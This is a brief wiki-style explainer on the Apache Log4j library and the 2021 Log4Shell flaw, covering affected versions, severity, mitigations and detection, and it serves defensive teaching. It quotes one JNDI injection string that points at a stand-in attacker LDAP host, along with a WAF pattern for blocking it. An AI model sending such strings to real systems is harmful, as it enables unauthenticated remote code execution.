# Apache Log4j

## What it is
Imagine a hotel's front desk that logs every visitor's name — but if a visitor writes a special instruction on their name tag, the front desk *executes that instruction* instead of just recording it. Apache Log4j is a widely-used Java logging library that, in vulnerable versions, did exactly this: it would interpret attacker-controlled strings as executable JNDI lookup commands rather than inert text.

## Why it matters
In December 2021, the Log4Shell vulnerability (CVE-2021-44228) allowed attackers to exploit internet-facing systems simply by sending a crafted string like `${jndi:ldap://attacker.com/exploit}` in an HTTP header. Systems ranging from Minecraft servers to enterprise VMware and Cisco products were vulnerable within hours of disclosure, making it one of the fastest-weaponized CVEs in history. Defenders had to frantically inventory every Java application to identify exposure.

## Key facts
- **CVE-2021-44228 (Log4Shell)** affects Log4j versions 2.0-beta9 through 2.14.1; the fix landed in version 2.15.0 (later hardened in 2.17.0)
- **Attack vector:** JNDI (Java Naming and Directory Interface) injection via LDAP, RMI, or DNS lookups triggered by logging user-supplied input
- **CVSS score: 10.0 (Critical)** — unauthenticated remote code execution with no user interaction required
- **Mitigation options include:** patching to 2.17.0+, setting `log4j2.formatMsgNoLookups=true`, or using a WAF rule to block `${jndi:` patterns
- **Detection indicator:** Outbound LDAP/RMI connections from application servers are a strong IOC for active exploitation attempts

## Related concepts
[[Remote Code Execution]] [[JNDI Injection]] [[CVE and CVSS Scoring]] [[Web Application Firewall]] [[Vulnerability Management]]